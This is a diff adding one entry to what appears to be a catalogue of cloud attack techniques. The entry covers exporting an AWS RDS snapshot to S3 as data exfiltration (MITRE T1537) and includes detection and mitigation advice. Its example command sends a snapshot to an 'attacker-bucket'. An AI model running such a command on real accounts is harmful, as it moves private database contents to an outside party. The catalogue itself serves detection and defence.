@@ -1,0 +1,22 @@
+Category: Data Exfiltration
+Command: aws rds start-export-task
+Detection:
+- Monitor CloudTrail for StartExportTask events.
+Example:
+- Command: aws rds start-export-task --export-task-identifier my-export --snapshot-arn
+    arn:aws:rds:REGION:ACCOUNT_ID:snapshot:my-snapshot --s3-bucket-name attacker-bucket
+  Output: Export task started
+MITRE_ATT&CK: T1537
+Service: AWS RDS
+description: Exports an RDS snapshot to S3 for data exfiltration.
+impact:
+- data exfiltration
+mitigation: Restrict RDS snapshot export permissions. Encrypt RDS instances.
+name: RDS Snapshot Export
+references:
+- https://docs.aws.amazon.com/AmazonRDS/latest/APIReference/API_StartExportTask.html
+tags:
+- data-exfiltration
+- rds
+- snapshot
+- T1537
